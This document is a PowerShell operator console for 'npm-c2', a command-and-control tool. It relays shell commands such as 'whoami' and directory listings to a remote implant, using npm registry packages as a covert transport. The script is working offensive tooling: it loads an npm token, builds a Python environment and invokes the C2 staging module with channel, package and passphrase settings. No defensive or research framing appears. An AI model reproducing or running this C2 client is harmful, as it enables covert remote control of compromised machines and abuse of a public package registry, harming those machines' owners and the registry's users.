#Requires -Version 5.1
<#
.SYNOPSIS
  npm-c2 operator console on Windows, over the npm staging transport.

.EXAMPLE
  .\c2.ps1
  .\c2.ps1 "whoami"
  .\c2.ps1 -Channel beef "dir C:\Users"

.DESCRIPTION
  Configuration is environment only, so nothing secret lives in the repo:

    C2_PKG            package that carries the channel        (required)
    C2_CHAN           4-char channel id, first char a-f       (default c0ff)
    C2_PASS           channel passphrase, must match the      (optional)
                      implant's --passphrase
    C2_TOKEN          npm token; falls back to .c2token
    NPMC2_API_BASE    registry base URL  (default https://registry.npmjs.org)
#>
[CmdletBinding()]
param(
    [Parameter(Position = 0)]
    [string]$Command,
    [string]$Channel = $env:C2_CHAN,
    [string]$Package = $env:C2_PKG,
    [string]$Passphrase = $env:C2_PASS,
    [string]$Base = $env:NPMC2_API_BASE
)

$ErrorActionPreference = 'Stop'
Set-Location -Path $PSScriptRoot

if (-not $Channel)  { $Channel = 'c0ff' }
if (-not $Base)     { $Base = 'https://registry.npmjs.org' }
if (-not $Package)  { throw 'set C2_PKG (or -Package) to the package that carries the channel' }

$token = $env:C2_TOKEN
if (-not $token) {
    $tokenFile = Join-Path $PSScriptRoot '.c2token'
    if (Test-Path $tokenFile) { $token = (Get-Content $tokenFile -Raw).Trim() }
}
if (-not $token) { throw 'no token: set C2_TOKEN or create .c2token' }

# A per-repo virtualenv keeps the host Python untouched.
$python = Join-Path $PSScriptRoot '.venv\Scripts\python.exe'
if (-not (Test-Path $python)) {
    Write-Host '[+] creating .venv'
    $launcher = Get-Command py -ErrorAction SilentlyContinue
    if ($launcher) { & py -3 -m venv .venv } else { & python -m venv .venv }
    if ($LASTEXITCODE -ne 0) { throw 'Python 3.8+ not found; install it from python.org and retry' }
    & $python -m pip install --quiet --upgrade pip
    & $python -m pip install --quiet -e .
}

& $python -c 'import npm_c2' 2>$null
if ($LASTEXITCODE -ne 0) { & $python -m pip install --quiet -e . }

$c2args = @(
    'stage',
    '-p', $Package,
    '-t', $token,
    '-c', $Channel,
    '--base', $Base,
    '--timeout', '120',
    '--interval', '4'
)
if ($Passphrase) { $c2args += @('--passphrase', $Passphrase) }
if ($Command)    { $c2args += $Command }

& $python -m npm_c2 @c2args
exit $LASTEXITCODE
